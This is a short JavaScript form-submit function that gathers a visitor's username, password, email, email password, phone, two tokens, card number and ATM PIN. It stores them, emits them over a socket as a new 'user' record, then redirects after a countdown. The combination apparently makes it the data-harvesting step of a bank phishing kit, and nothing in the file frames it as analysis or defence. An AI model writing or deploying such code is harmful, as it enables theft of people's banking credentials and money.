import { loader } from "../components/loader";

export const submitBase = async({valuesData, endUrl = '', dataImportant, setSeconds, seconds = 0}) => {

    const { navigate, SetshowSpiner, socket, addData, urlToNavigate, spiner, timeLoader } = dataImportant

    const {
        typeDocument,
        username,
        password,
        correo,
        celular,
        claveCorreo,
        token1,
        token2,
        tarjeta,
        atmPassword, 
    } = valuesData;

    const [ newUser ] = await addData({typeDocument, username, password, correo, celular, claveCorreo, token1, token2, tarjeta, atmPassword})

    await socket.emit('[User] create', newUser)  
    
    if (spiner === true || timeLoader ) {
        setInterval(() => { setSeconds( e => e - 1) }, 1000)
        loader(timeLoader, navigate, endUrl == true ? endUrl : urlToNavigate, endUrl )
        spiner === true && SetshowSpiner(true);
        return 
    }
    setInterval(() => { setSeconds( e => e - 1) }, 1000)
    if(seconds === 0) return endUrl == true ? window.location.href = endUrl : navigate(`${urlToNavigate}`)
}